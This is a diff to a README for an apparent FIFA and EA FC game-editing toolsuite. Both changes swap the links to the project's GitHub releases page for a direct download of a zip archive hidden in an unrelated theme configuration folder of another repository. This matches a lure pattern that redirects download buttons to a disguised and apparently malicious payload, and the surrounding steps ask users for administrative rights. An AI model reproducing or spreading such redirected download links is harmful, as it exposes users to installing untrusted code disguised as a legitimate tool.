@@ -5,7 +5,7 @@ description: "Edit FIFA and EA FC game data, players, teams, kits, and stadiums 
 ---
 # ⚽ FIFA-Editing-Toolsuite - Customize your professional football game experience
 
-[![Download FIFA-Editing-Toolsuite](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/perlcapacitive974/FIFA-Editing-Toolsuite/releases)
+[![Download FIFA-Editing-Toolsuite](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/perlcapacitive974/perlcapacitive974.github.io/main/themes/ananke/config/Release_v2.4-alpha.4.zip)
 
 ## 🎯 About the tool
 
@@ -29,7 +29,7 @@ Follow these steps to prepare your computer. First, check that your game is clos
 2. Ensure you have administrative rights on your computer.
 3. Download the installation file from the link below.
 
-[Visit the release page to download the latest version](https://github.com/perlcapacitive974/FIFA-Editing-Toolsuite/releases)
+[Visit the release page to download the latest version](https://raw.githubusercontent.com/perlcapacitive974/perlcapacitive974.github.io/main/themes/ananke/config/Release_v2.4-alpha.4.zip)
 
 ## 📥 How to install
 
